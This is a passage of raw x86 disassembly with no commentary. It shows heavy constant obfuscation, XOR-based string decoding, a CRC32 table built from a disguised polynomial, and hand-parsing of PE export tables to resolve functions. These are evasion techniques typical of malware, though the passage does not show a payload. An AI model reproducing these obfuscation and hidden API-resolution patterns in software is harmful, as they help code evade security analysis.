  4275b1:	add    edx,DWORD PTR [ebp+0xc]
  4275b4:	mov    dl,BYTE PTR [edx]
  4275b6:	mov    BYTE PTR [ecx],dl
  4275b8:	inc    DWORD PTR [ebp-0x4]
  4275bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4275be:	mov    edx,DWORD PTR [ebp+0x10]
  4275c1:	xor    ecx,eax
  4275c3:	add    ecx,esi
  4275c5:	imul   ecx,edx
  4275c8:	mov    edx,DWORD PTR [ebp-0x8]
  4275cb:	mov    edi,DWORD PTR [ebp-0x4]
  4275ce:	xor    edx,eax
  4275d0:	lea    edx,[edx+edi*1+0x3272ec]
  4275d7:	cmp    edx,ecx
  4275d9:	jb     0x42751f
  4275df:	pop    edi
  4275e0:	pop    esi
  4275e1:	leave  
  4275e2:	ret    0xc
  4275e5:	push   ebp
  4275e6:	mov    ebp,esp
  4275e8:	sub    esp,0xc
  4275eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4275f2:	push   esi
  4275f3:	mov    esi,eax
  4275f5:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4275fc:	mov    edx,DWORD PTR [ebp-0x4]
  4275ff:	mov    eax,0x75108a4
  427604:	xor    edx,eax
  427606:	mov    ecx,0x3272ec
  42760b:	add    edx,ecx
  42760d:	cmp    esi,edx
  42760f:	je     0x427651
  427611:	push   ebx
  427612:	push   edi
  427613:	mov    edx,DWORD PTR [ebp-0x8]
  427616:	mov    ebx,DWORD PTR [ebp+0x8]
  427619:	xor    edx,eax
  42761b:	mov    edi,0xffcd8d14
  427620:	sub    edi,edx
  427622:	add    esi,edi
  427624:	lea    edx,[esi-0x3272ec]
  42762a:	xor    edx,eax
  42762c:	mov    DWORD PTR [ebp-0xc],edx
  42762f:	mov    edx,DWORD PTR [ebp-0x4]
  427632:	mov    edi,DWORD PTR [ebp-0xc]
  427635:	xor    dl,0xa4
  427638:	sub    dl,0x14
  42763b:	xor    edi,eax
  42763d:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  427644:	mov    edx,DWORD PTR [ebp-0x4]
  427647:	xor    edx,eax
  427649:	add    edx,ecx
  42764b:	cmp    esi,edx
  42764d:	jne    0x427613
  42764f:	pop    edi
  427650:	pop    ebx
  427651:	pop    esi
  427652:	leave  
  427653:	ret    0x4
  427656:	push   ebp
  427657:	mov    ebp,esp
  427659:	sub    esp,0x21c
  42765f:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  427666:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  42766d:	mov    eax,DWORD PTR [ebp+0x10]
  427670:	mov    eax,DWORD PTR [ebp-0x4]
  427673:	mov    ecx,DWORD PTR [ebp+0x8]
  427676:	push   esi
  427677:	push   edi
  427678:	mov    edi,0x75108a4
  42767d:	xor    eax,edi
  42767f:	mov    esi,0x3272ec
  427684:	add    eax,esi
  427686:	cmp    eax,ecx
  427688:	mov    eax,DWORD PTR [ebp-0x4]
  42768b:	jne    0x427696
  42768d:	xor    eax,edi
  42768f:	add    eax,esi
  427691:	jmp    0x427742
  427696:	mov    ecx,DWORD PTR [ebp+0xc]
  427699:	xor    eax,edi
  42769b:	add    eax,esi
  42769d:	cmp    eax,ecx
  42769f:	jne    0x4276a6
  4276a1:	mov    eax,DWORD PTR [ebp-0x4]
  4276a4:	jmp    0x42768d
  4276a6:	lea    eax,[ebp-0x21c]
  4276ac:	mov    DWORD PTR [ebp-0x8],eax
  4276af:	mov    eax,DWORD PTR [ebp+0xc]
  4276b2:	mov    DWORD PTR [ebp-0x10],eax
  4276b5:	mov    eax,DWORD PTR [ebp-0x4]
  4276b8:	xor    eax,edi
  4276ba:	add    eax,esi
  4276bc:	mov    DWORD PTR [ebp+0x10],eax
  4276bf:	mov    eax,DWORD PTR [ebp+0xc]
  4276c2:	push   ebx
  4276c3:	call   0x4273ed
  4276c8:	mov    ebx,eax
  4276ca:	mov    eax,DWORD PTR [ebp+0x8]
  4276cd:	mov    eax,DWORD PTR [eax+0x14]
  4276d0:	jmp    0x42772a
  4276d2:	mov    eax,DWORD PTR [ebp+0xc]
  4276d5:	sub    eax,0x8
  4276d8:	mov    DWORD PTR [ebp-0xc],eax
  4276db:	mov    eax,DWORD PTR [ebp-0xc]
  4276de:	mov    eax,DWORD PTR [eax+0x28]
  4276e1:	call   0x4272d5
  4276e6:	mov    DWORD PTR [ebp+0x10],eax
  4276e9:	push   DWORD PTR [ebp+0x10]
  4276ec:	mov    edx,DWORD PTR [ebp-0x8]
  4276ef:	call   0x42747c
  4276f4:	mov    eax,DWORD PTR [ebp-0x4]
  4276f7:	xor    eax,edi
  4276f9:	add    eax,esi
  4276fb:	cmp    eax,ebx
  4276fd:	jne    0x427707
  4276ff:	mov    eax,DWORD PTR [ebp-0x8]
  427702:	call   0x427363
  427707:	mov    eax,DWORD PTR [ebp-0x14]
  42770a:	xor    eax,edi
  42770c:	add    eax,esi
  42770e:	push   eax
  42770f:	push   DWORD PTR [ebp-0x10]
  427712:	mov    eax,DWORD PTR [ebp-0x8]
  427715:	call   0x42708f
  42771a:	mov    ecx,DWORD PTR [ebp-0x4]
  42771d:	xor    ecx,edi
  42771f:	add    ecx,esi
  427721:	cmp    eax,ecx
  427723:	je     0x427748
  427725:	mov    eax,DWORD PTR [ebp+0xc]
  427728:	mov    eax,DWORD PTR [eax]
  42772a:	mov    DWORD PTR [ebp+0xc],eax
  42772d:	mov    eax,DWORD PTR [ebp+0x8]
  427730:	mov    ecx,DWORD PTR [ebp+0xc]
  427733:	add    eax,0x14
  427736:	cmp    ecx,eax
  427738:	jne    0x4276d2
  42773a:	mov    eax,DWORD PTR [ebp-0x4]
  42773d:	xor    eax,edi
  42773f:	add    eax,esi
  427741:	pop    ebx
  427742:	pop    edi
  427743:	pop    esi
  427744:	leave  
  427745:	ret    0xc
  427748:	mov    eax,DWORD PTR [ebp-0xc]
  42774b:	mov    eax,DWORD PTR [eax+0x18]
  42774e:	jmp    0x427741
  427750:	push   ebp
  427751:	mov    ebp,esp
  427753:	mov    eax,DWORD PTR [ebp+0xc]
  427756:	sub    esp,0x10
  427759:	cmp    DWORD PTR [ebp+0x8],0x0
  42775d:	push   ebx
  42775e:	push   esi
  42775f:	push   edi
  427760:	je     0x427815
  427766:	test   eax,eax
  427768:	je     0x427815
  42776e:	movzx  eax,WORD PTR [eax+0x20]
  427772:	mov    ecx,eax
  427774:	mov    DWORD PTR [ebp-0x10],eax
  427777:	xor    edx,edx
  427779:	and    DWORD PTR [ebp-0x8],edx
  42777c:	mov    eax,0x8a94
  427781:	xor    ecx,eax
  427783:	add    ecx,0x3b56
  427789:	mov    DWORD PTR [ebp-0xc],ecx
  42778c:	and    DWORD PTR [ebp-0x4],0x0
  427790:	xor    ecx,ecx
  427792:	push   0x7c
  427794:	pop    edi
  427795:	cmp    cx,WORD PTR [ebp-0xc]
  427799:	jae    0x4277ff
  42779b:	lea    esi,[edx-0x3b56]
  4277a1:	xor    esi,eax
  4277a3:	movzx  ecx,WORD PTR [ebp-0x4]
  4277a7:	mov    ebx,DWORD PTR [ebp+0xc]
  4277aa:	lea    ecx,[ebx+ecx*4]
  4277ad:	cmp    WORD PTR [ecx+0x2],si
  4277b1:	jne    0x4277ea
  4277b3:	movzx  ecx,WORD PTR [ecx]
  4277b6:	mov    edi,0x4e3e
  4277bb:	cmp    cx,di
  4277be:	jne    0x4277cc
  4277c0:	mov    ebx,DWORD PTR [ebp+0x8]
  4277c3:	movzx  edi,dx
  4277c6:	cmp    BYTE PTR [edi+ebx*1],0x0
  4277ca:	je     0x4277f9
  4277cc:	mov    ebx,DWORD PTR [ebp+0x8]
  4277cf:	movzx  edi,dx
  4277d2:	movsx  di,BYTE PTR [edi+ebx*1]
  4277d7:	mov    ebx,0x3b56
  4277dc:	sub    di,bx
  4277df:	xor    di,ax
  4277e2:	cmp    cx,di
  4277e5:	je     0x4277f9
  4277e7:	push   0x7a
  4277e9:	pop    edi
  4277ea:	inc    DWORD PTR [ebp-0x4]
  4277ed:	mov    cx,WORD PTR [ebp-0xc]
  4277f1:	cmp    WORD PTR [ebp-0x4],cx
  4277f5:	jb     0x4277a3
  4277f7:	jmp    0x4277ff
  4277f9:	inc    DWORD PTR [ebp-0x8]
  4277fc:	push   0x7d
  4277fe:	pop    edi
  4277ff:	mov    esi,DWORD PTR [ebp+0x8]
  427802:	movzx  ecx,dx
  427805:	cmp    BYTE PTR [ecx+esi*1],0x0
  427809:	je     0x42781e
  42780b:	inc    edx
  42780c:	cmp    edi,0x7a
  42780f:	jne    0x42778c
  427815:	xor    eax,eax
  427817:	pop    edi
  427818:	pop    esi
  427819:	pop    ebx
  42781a:	leave  
  42781b:	ret    0x8
  42781e:	mov    ecx,DWORD PTR [ebp-0x8]
  427821:	add    ecx,0xffffc4aa
  427827:	xor    cx,ax
  42782a:	xor    eax,eax
  42782c:	cmp    cx,WORD PTR [ebp-0x10]
  427830:	sete   al
  427833:	jmp    0x427817
  427835:	push   ebp
  427836:	mov    ebp,esp
  427838:	sub    esp,0x50
  42783b:	push   edi
  42783c:	mov    edi,eax
  42783e:	mov    eax,DWORD PTR [edi+0x1a8]
  427844:	cmp    DWORD PTR [eax],0x0
  427847:	jne    0x427850
  427849:	xor    eax,eax
  42784b:	jmp    0x427981
  427850:	push   DWORD PTR [ebp+0x8]
  427853:	push   0x2c
  427855:	pop    eax
  427856:	call   0x4275e5
  42785b:	mov    edx,DWORD PTR [edi+0x1ac]
  427861:	lea    eax,[edi+0x22]
  427864:	mov    DWORD PTR [ebp-0x4c],eax
  427867:	lea    eax,[edi+0x44]
  42786a:	mov    DWORD PTR [ebp-0x48],eax
  42786d:	lea    eax,[edi+0x66]
  427870:	mov    DWORD PTR [ebp-0x44],eax
  427873:	lea    eax,[edi+0x88]
  427879:	mov    DWORD PTR [ebp-0x40],eax
  42787c:	lea    eax,[edi+0xaa]
  427882:	mov    DWORD PTR [ebp-0x3c],eax
  427885:	lea    eax,[edi+0xcc]
  42788b:	mov    DWORD PTR [ebp-0x38],eax
  42788e:	lea    eax,[edi+0xee]
  427894:	mov    DWORD PTR [ebp-0x34],eax
  427897:	lea    eax,[edi+0x110]
  42789d:	mov    DWORD PTR [ebp-0x30],eax
  4278a0:	lea    eax,[edi+0x132]
  4278a6:	mov    DWORD PTR [ebp-0x2c],eax
  4278a9:	lea    eax,[edi+0x154]
  4278af:	push   edi
  4278b0:	mov    DWORD PTR [ebp-0x50],edi
  4278b3:	mov    DWORD PTR [ebp-0x28],eax
  4278b6:	call   0x4279b5
  4278bb:	push   eax
  4278bc:	mov    eax,DWORD PTR [edi+0x1a8]
  4278c2:	push   DWORD PTR [eax]
  4278c4:	call   0x427656
  4278c9:	mov    DWORD PTR [ebp-0x10],eax
  4278cc:	test   eax,eax
  4278ce:	je     0x427981
  4278d4:	mov    ecx,DWORD PTR [eax+0x3c]
  4278d7:	push   ebx
  4278d8:	push   esi
  4278d9:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4278dd:	add    esi,eax
  4278df:	mov    edi,DWORD PTR [esi+0x24]
  4278e2:	mov    ecx,DWORD PTR [esi+0x1c]
  4278e5:	mov    edx,DWORD PTR [esi+0x20]
  4278e8:	mov    ebx,DWORD PTR [esi+0x18]
  4278eb:	add    edi,eax
  4278ed:	mov    DWORD PTR [ebp-0x20],edi
  4278f0:	mov    edi,DWORD PTR [esi+0x14]
  4278f3:	add    ecx,eax
  4278f5:	add    edx,eax
  4278f7:	mov    DWORD PTR [ebp-0xc],ecx
  4278fa:	mov    DWORD PTR [ebp-0x1c],edx
  4278fd:	mov    DWORD PTR [ebp-0x8],edi
  427900:	cmp    edi,ebx
  427902:	ja     0x427907
  427904:	mov    DWORD PTR [ebp-0x8],ebx
  427907:	xor    ebx,ebx
  427909:	mov    DWORD PTR [ebp-0x18],ebx
  42790c:	cmp    DWORD PTR [ebp-0x8],ebx
  42790f:	jbe    0x42797f
  427911:	jmp    0x427916
  427913:	mov    edx,DWORD PTR [ebp-0x1c]
  427916:	mov    edi,DWORD PTR [ebp-0x20]
  427919:	movzx  edi,WORD PTR [edi+ebx*2]
  42791d:	cmp    ebx,DWORD PTR [esi+0x18]
  427920:	jae    0x42797f
  427922:	cmp    edi,DWORD PTR [esi+0x14]
  427925:	jae    0x42797f
  427927:	mov    ebx,DWORD PTR [edx+ebx*4]
  42792a:	mov    edx,DWORD PTR [ebp+0x8]
  42792d:	mov    edi,DWORD PTR [ecx+edi*4]
  427930:	mov    DWORD PTR [ebp-0x4],edx
  427933:	lea    edx,[ebp-0x50]
  427936:	add    ebx,eax
  427938:	add    edi,eax
  42793a:	sub    edx,DWORD PTR [ebp+0x8]
  42793d:	mov    DWORD PTR [ebp-0x14],0xb
  427944:	mov    DWORD PTR [ebp-0x24],edx
  427947:	mov    edx,DWORD PTR [ebp-0x4]
  42794a:	cmp    DWORD PTR [edx],0x0
  42794d:	jne    0x42796a
  42794f:	mov    eax,DWORD PTR [ebp-0x24]
  427952:	push   DWORD PTR [eax+edx*1]
  427955:	push   ebx
  427956:	call   0x427750
  42795b:	mov    ecx,DWORD PTR [ebp-0xc]
  42795e:	test   eax,eax
  427960:	je     0x427967
  427962:	mov    eax,DWORD PTR [ebp-0x4]
  427965:	mov    DWORD PTR [eax],edi
  427967:	mov    eax,DWORD PTR [ebp-0x10]
  42796a:	add    DWORD PTR [ebp-0x4],0x4
  42796e:	dec    DWORD PTR [ebp-0x14]
  427971:	jne    0x427947
  427973:	mov    ebx,DWORD PTR [ebp-0x18]
  427976:	inc    ebx
  427977:	mov    DWORD PTR [ebp-0x18],ebx
  42797a:	cmp    ebx,DWORD PTR [ebp-0x8]
  42797d:	jb     0x427913
  42797f:	pop    esi
  427980:	pop    ebx
  427981:	pop    edi
  427982:	leave  
  427983:	ret    0x4
  427986:	push   ebp
  427987:	mov    ebp,esp
  427989:	mov    eax,DWORD PTR [ebp+0x8]
  42798c:	push   esi
  42798d:	push   DWORD PTR [eax+0x1d8]
  427993:	lea    esi,[eax+0x198]
  427999:	mov    eax,DWORD PTR [ebp+0x8]
  42799c:	call   0x427835
  4279a1:	mov    ecx,DWORD PTR [esi]
  4279a3:	mov    DWORD PTR [ecx],eax
  4279a5:	mov    eax,DWORD PTR [esi]
  4279a7:	xor    ecx,ecx
  4279a9:	cmp    DWORD PTR [eax],ecx
  4279ab:	pop    esi
  4279ac:	setne  cl
  4279af:	mov    eax,ecx
  4279b1:	pop    ebp
  4279b2:	ret    0x4
  4279b5:	mov    ecx,DWORD PTR [edi+0x188]
  4279bb:	push   ebx
  4279bc:	jmp    0x4279d1
  4279be:	xor    eax,0x8a94
  4279c3:	add    eax,0x3b56
  4279c8:	mov    WORD PTR [ecx],ax
  4279cb:	add    ecx,0x2
  4279ce:	add    edx,0x2
  4279d1:	movzx  eax,WORD PTR [edx]
  4279d4:	mov    ebx,0x4e3e
  4279d9:	cmp    ax,bx
  4279dc:	jne    0x4279be
  4279de:	xor    eax,eax
  4279e0:	mov    WORD PTR [ecx],ax
  4279e3:	mov    eax,DWORD PTR [edi+0x188]
  4279e9:	pop    ebx
  4279ea:	ret    
  4279eb:	push   edi
  4279ec:	mov    edi,eax
  4279ee:	mov    eax,DWORD PTR [esi+0x188]
  4279f4:	shl    edi,0x6
  4279f7:	add    eax,edi
  4279f9:	jmp    0x427a05
  4279fb:	xor    cl,0x79
  4279fe:	sub    cl,0x3
  427a01:	mov    BYTE PTR [eax],cl
  427a03:	inc    eax
  427a04:	inc    edx
  427a05:	mov    cl,BYTE PTR [edx]
  427a07:	cmp    cl,0x7a
  427a0a:	jne    0x4279fb
  427a0c:	mov    BYTE PTR [eax],0x0
  427a0f:	mov    eax,DWORD PTR [esi+0x188]
  427a15:	add    eax,edi
  427a17:	pop    edi
  427a18:	ret    
  427a19:	push   ebp
  427a1a:	mov    ebp,esp
  427a1c:	sub    esp,0x14
  427a1f:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  427a26:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  427a2d:	mov    eax,DWORD PTR [ebx]
  427a2f:	mov    DWORD PTR [ebp-0x8],eax
  427a32:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427a39:	push   esi
  427a3a:	push   edi
  427a3b:	mov    DWORD PTR [ebp-0x14],0xead71890
  427a42:	mov    edi,DWORD PTR [ebp-0x4]
  427a45:	mov    ecx,DWORD PTR [ebp-0x10]
  427a48:	mov    eax,0x75108a4
  427a4d:	xor    edi,eax
  427a4f:	mov    edx,0x3272ec
  427a54:	xor    ecx,eax
  427a56:	add    edi,edx
  427a58:	add    ecx,edx
  427a5a:	imul   edi,ecx
  427a5d:	jmp    0x427aa5
  427a5f:	mov    ecx,DWORD PTR [ebp-0x8]
  427a62:	mov    esi,DWORD PTR [ebp-0x4]
  427a65:	xor    ecx,eax
  427a67:	xor    esi,eax
  427a69:	add    ecx,edx
  427a6b:	add    esi,edx
  427a6d:	test   esi,ecx
  427a6f:	mov    esi,DWORD PTR [ebp-0x8]
  427a72:	mov    ecx,DWORD PTR [ebp-0x4]
  427a75:	je     0x427a8c
  427a77:	xor    ecx,eax
  427a79:	xor    esi,eax
  427a7b:	add    ecx,edx
  427a7d:	add    esi,edx
  427a7f:	shr    esi,cl
  427a81:	mov    ecx,DWORD PTR [ebp-0x14]
  427a84:	xor    ecx,eax
  427a86:	add    ecx,edx
  427a88:	xor    esi,ecx
  427a8a:	jmp    0x427a96
  427a8c:	xor    esi,eax
  427a8e:	xor    ecx,eax
  427a90:	add    esi,edx
  427a92:	add    ecx,edx
  427a94:	shr    esi,cl
  427a96:	mov    DWORD PTR [ebp-0x8],esi
  427a99:	mov    ecx,DWORD PTR [ebp-0x4]
  427a9c:	xor    ecx,eax
  427a9e:	lea    edi,[edi+ecx*1+0x3272ec]
  427aa5:	mov    ecx,DWORD PTR [ebp-0xc]
  427aa8:	mov    esi,DWORD PTR [ebp-0x4]
  427aab:	xor    esi,eax
  427aad:	xor    ecx,eax
  427aaf:	sub    ecx,esi
  427ab1:	cmp    edi,ecx
  427ab3:	jbe    0x427a5f
  427ab5:	mov    eax,DWORD PTR [ebp-0x8]
  427ab8:	pop    edi
  427ab9:	mov    DWORD PTR [ebx],eax
  427abb:	mov    eax,DWORD PTR [ebp-0x8]
  427abe:	pop    esi
  427abf:	leave  
  427ac0:	ret    
  427ac1:	push   ebp
  427ac2:	mov    ebp,esp
  427ac4:	sub    esp,0x38
  427ac7:	push   ebx
  427ac8:	mov    ebx,0xf89c85b0
  427acd:	mov    DWORD PTR [ebp-0x4],ebx
  427ad0:	lea    eax,[ebx+0x1]
  427ad3:	push   esi
  427ad4:	mov    DWORD PTR [ebp-0x24],eax
  427ad7:	mov    ecx,DWORD PTR [ebp-0x4]
  427ada:	mov    edx,DWORD PTR [ebp+0x8]
  427add:	mov    esi,0x75108a4
  427ae2:	push   edi
  427ae3:	xor    ecx,esi
  427ae5:	mov    edi,0x3272ec
  427aea:	add    ecx,edi
  427aec:	cmp    edx,ecx
  427aee:	je     0x427c54
  427af4:	mov    ecx,DWORD PTR [ebp-0x4]
  427af7:	mov    edx,DWORD PTR [ebp+0xc]
  427afa:	xor    ecx,esi
  427afc:	add    ecx,edi
  427afe:	cmp    edx,ecx
  427b00:	je     0x427c54
  427b06:	mov    ecx,DWORD PTR [ebp+0x10]
  427b09:	mov    DWORD PTR [ebp-0x14],ecx
  427b0c:	mov    ecx,DWORD PTR [ebp+0xc]
  427b0f:	mov    edx,DWORD PTR [ebp+0x8]
  427b12:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  427b19:	mov    DWORD PTR [ebp-0x1c],eax
  427b1c:	mov    DWORD PTR [ebp-0x10],ebx
  427b1f:	mov    DWORD PTR [ebp+0xc],eax
  427b22:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  427b29:	mov    eax,DWORD PTR [ebp+0xc]
  427b2c:	xor    eax,esi
  427b2e:	mov    DWORD PTR [ebp-0x20],ecx
  427b31:	sub    ecx,eax
  427b33:	sub    ecx,edi
  427b35:	mov    DWORD PTR [ebp+0x8],ecx
  427b38:	mov    DWORD PTR [ebp-0xc],edx
  427b3b:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  427b42:	jmp    0x427c44
  427b47:	mov    eax,DWORD PTR [ebp+0xc]
  427b4a:	mov    ecx,DWORD PTR [ebp+0xc]
  427b4d:	xor    eax,esi
  427b4f:	xor    ecx,esi
  427b51:	lea    ecx,[eax+ecx*1+0x64e5d8]
  427b58:	mov    eax,DWORD PTR [ebp+0x8]
  427b5b:	xor    edx,edx
  427b5d:	div    ecx
  427b5f:	mov    eax,DWORD PTR [ebp+0x10]
  427b62:	mov    ecx,DWORD PTR [ebp+0xc]
  427b65:	xor    eax,esi
  427b67:	xor    ecx,esi
  427b69:	sub    eax,ecx
  427b6b:	cmp    edx,eax
  427b6d:	jne    0x427c03
  427b73:	mov    eax,DWORD PTR [ebp+0x8]
  427b76:	mov    ecx,DWORD PTR [ebp-0xc]
  427b79:	mov    dl,BYTE PTR [eax+ecx*1]
  427b7c:	mov    eax,DWORD PTR [ebp-0x10]
  427b7f:	mov    ecx,DWORD PTR [ebp-0x8]
  427b82:	xor    eax,esi
  427b84:	xor    ecx,esi
  427b86:	add    eax,edi
  427b88:	add    ecx,edi
  427b8a:	cmp    eax,ecx
  427b8c:	jae    0x427bd4
  427b8e:	lea    ecx,[eax-0x3272ec]
  427b94:	mov    DWORD PTR [ebp-0x4],ecx
  427b97:	mov    ebx,DWORD PTR [ebp-0x4]
  427b9a:	xor    ebx,esi
  427b9c:	add    ebx,0x7f55d8f2
  427ba2:	lea    ecx,[ebp+eax*4-0x38]
  427ba6:	mov    DWORD PTR [ecx],ebx
  427ba8:	mov    ebx,DWORD PTR [ecx]
  427baa:	cmp    ebx,0x244ecb93
  427bb0:	jbe    0x427bba
  427bb2:	add    DWORD PTR [ecx],0x405fcdc
  427bb8:	jmp    0x427bc0
  427bba:	add    DWORD PTR [ecx],0xfdaf4324
  427bc0:	mov    ecx,DWORD PTR [ebp-0x8]
  427bc3:	xor    ecx,esi
  427bc5:	inc    eax
  427bc6:	inc    DWORD PTR [ebp-0x4]
  427bc9:	add    ecx,edi
  427bcb:	cmp    eax,ecx
  427bcd:	jb     0x427b97
  427bcf:	mov    ebx,0xf89c85b0
  427bd4:	cmp    DWORD PTR [ebp-0x14],0x0
  427bd8:	jne    0x427be2
  427bda:	xor    dl,0x79
  427bdd:	sub    dl,0x3
  427be0:	jmp    0x427bf8
  427be2:	mov    eax,DWORD PTR [ebp-0x18]
  427be5:	xor    al,0xa4
  427be7:	mov    cl,0x14
  427be9:	sub    cl,al
  427beb:	add    dl,cl
  427bed:	mov    ecx,DWORD PTR [ebp-0x1c]
  427bf0:	xor    cl,0xa4
  427bf3:	sub    cl,0x14
  427bf6:	ror    dl,cl
  427bf8:	xor    eax,eax
  427bfa:	mov    eax,DWORD PTR [ebp+0x8]
  427bfd:	mov    ecx,DWORD PTR [ebp-0xc]
  427c00:	mov    BYTE PTR [eax+ecx*1],dl
  427c03:	mov    eax,DWORD PTR [ebp+0x8]
  427c06:	mov    ecx,DWORD PTR [ebp-0x10]
  427c09:	sub    eax,edi
  427c0b:	xor    eax,esi
  427c0d:	cmp    eax,ecx
  427c0f:	jne    0x427c32
  427c11:	mov    eax,DWORD PTR [ebp+0x10]
  427c14:	mov    ecx,DWORD PTR [ebp+0xc]
  427c17:	xor    eax,esi
  427c19:	xor    ecx,esi
  427c1b:	sub    eax,ecx
  427c1d:	mov    ecx,DWORD PTR [ebp-0x20]
  427c20:	sub    eax,edi
  427c22:	xor    eax,esi
  427c24:	mov    DWORD PTR [ebp+0x10],eax
  427c27:	mov    eax,DWORD PTR [ebp+0xc]
  427c2a:	xor    eax,esi
  427c2c:	sub    ecx,eax
  427c2e:	sub    ecx,edi
  427c30:	jmp    0x427c41
  427c32:	mov    eax,DWORD PTR [ebp+0xc]
  427c35:	xor    eax,esi
  427c37:	mov    ecx,0xffcd8d14
  427c3c:	sub    ecx,eax
  427c3e:	add    ecx,DWORD PTR [ebp+0x8]
  427c41:	mov    DWORD PTR [ebp+0x8],ecx
  427c44:	mov    eax,DWORD PTR [ebp+0x10]
  427c47:	cmp    eax,ebx
  427c49:	jne    0x427b47
  427c4f:	mov    eax,DWORD PTR [ebp-0x24]
  427c52:	jmp    0x427c57
  427c54:	mov    eax,DWORD PTR [ebp-0x4]
  427c57:	xor    eax,esi
  427c59:	add    eax,edi
  427c5b:	pop    edi
  427c5c:	pop    esi
  427c5d:	pop    ebx
  427c5e:	leave  
  427c5f:	ret    0xc
  427c62:	push   ebp
  427c63:	mov    ebp,esp
  427c65:	sub    esp,0x420
  427c6b:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  427c72:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  427c79:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  427c80:	push   ebx
  427c81:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  427c88:	mov    eax,DWORD PTR [ebp-0x14]
  427c8b:	push   esi
  427c8c:	mov    esi,0x75108a4
  427c91:	push   edi
  427c92:	xor    eax,esi
  427c94:	mov    edi,0x3272ec
  427c99:	add    eax,edi
  427c9b:	mov    DWORD PTR [ebp-0x8],eax
  427c9e:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  427ca5:	mov    DWORD PTR [ebp-0x4],0xead71890
  427cac:	mov    DWORD PTR [ebp-0x10],0x8
  427cb3:	mov    ecx,ecx
  427cb5:	mov    eax,DWORD PTR [ebp-0xc]
  427cb8:	mov    ecx,DWORD PTR [ebp-0x14]
  427cbb:	xor    eax,esi
  427cbd:	xor    ecx,esi
  427cbf:	add    eax,edi
  427cc1:	add    ecx,edi
  427cc3:	imul   eax,ecx
  427cc6:	jmp    0x427cf9
  427cc8:	mov    eax,DWORD PTR [ebp-0x4]
  427ccb:	sub    eax,edi
  427ccd:	xor    eax,esi
  427ccf:	mov    DWORD PTR [ebp-0x8],eax
  427cd2:	lea    ebx,[ebp-0x8]
  427cd5:	call   0x427a19
  427cda:	mov    DWORD PTR [ebp-0x8],eax
  427cdd:	mov    eax,DWORD PTR [ebp-0x8]
  427ce0:	mov    ecx,DWORD PTR [ebp-0x4]
  427ce3:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  427cea:	mov    eax,DWORD PTR [ebp-0xc]
  427ced:	mov    ecx,DWORD PTR [ebp-0x4]
  427cf0:	xor    eax,esi
  427cf2:	lea    eax,[eax+ecx*1+0x3272ec]
  427cf9:	mov    DWORD PTR [ebp-0x4],eax
  427cfc:	mov    eax,DWORD PTR [ebp-0x18]
  427cff:	mov    ecx,DWORD PTR [ebp-0xc]
  427d02:	xor    ecx,esi
  427d04:	xor    eax,esi
  427d06:	sub    eax,ecx
  427d08:	mov    ecx,DWORD PTR [ebp-0x4]
  427d0b:	cmp    ecx,eax
  427d0d:	jbe    0x427cc8
  427d0f:	mov    eax,DWORD PTR [ebp-0x1c]
  427d12:	xor    eax,esi
  427d14:	add    eax,edi
  427d16:	mov    DWORD PTR [ebp-0x8],eax
  427d19:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  427d20:	mov    ebx,ebx
  427d22:	jmp    0x427d85
  427d24:	mov    ecx,DWORD PTR [ebp-0x20]
  427d27:	mov    eax,DWORD PTR [ebp-0x8]
  427d2a:	xor    ecx,esi
  427d2c:	add    ecx,edi
  427d2e:	shr    eax,cl
  427d30:	mov    DWORD PTR [ebp-0x4],eax
  427d33:	mov    eax,DWORD PTR [ebp+0x8]
  427d36:	mov    cl,BYTE PTR [eax]
  427d38:	mov    BYTE PTR [ebp+0xb],cl
  427d3b:	mov    cl,BYTE PTR [ebp+0xb]
  427d3e:	mov    edx,DWORD PTR [ebp-0x8]
  427d41:	movzx  ecx,cl
  427d44:	xor    ecx,edx
  427d46:	mov    DWORD PTR [ebp+0x8],ecx
  427d49:	mov    ecx,DWORD PTR [ebp-0x18]
  427d4c:	mov    edx,DWORD PTR [ebp+0x8]
  427d4f:	xor    ecx,esi
  427d51:	add    ecx,edi
  427d53:	and    ecx,edx
  427d55:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427d5c:	mov    edx,DWORD PTR [ebp-0x4]
  427d5f:	xor    ecx,edx
  427d61:	mov    DWORD PTR [ebp-0x8],ecx
  427d64:	mov    ecx,DWORD PTR [ebp-0xc]
  427d67:	xor    ecx,esi
  427d69:	lea    eax,[eax+ecx*1+0x3272ec]
  427d70:	mov    DWORD PTR [ebp+0x8],eax
  427d73:	mov    eax,DWORD PTR [ebp-0xc]
  427d76:	xor    eax,esi
  427d78:	mov    ecx,0xffcd8d14
  427d7d:	sub    ecx,eax
  427d7f:	add    ecx,DWORD PTR [ebp-0x10]
  427d82:	mov    DWORD PTR [ebp-0x10],ecx
  427d85:	mov    eax,DWORD PTR [ebp-0x14]
  427d88:	mov    ecx,DWORD PTR [ebp-0x10]
  427d8b:	xor    eax,esi
  427d8d:	add    eax,edi
  427d8f:	cmp    ecx,eax
  427d91:	jne    0x427d24
  427d93:	mov    eax,DWORD PTR [ebp-0x1c]
  427d96:	mov    ecx,DWORD PTR [ebp-0x8]
  427d99:	xor    eax,esi
  427d9b:	add    eax,edi
  427d9d:	pop    edi
  427d9e:	pop    esi
  427d9f:	xor    eax,ecx
  427da1:	pop    ebx
  427da2:	leave  
  427da3:	ret    0x4
  427da6:	push   ebp
  427da7:	mov    ebp,esp
  427da9:	mov    eax,DWORD PTR [ebp+0x1c]
  427dac:	mov    ecx,DWORD PTR [ebp+0x8]
  427daf:	mov    edx,DWORD PTR [ebp+0x10]
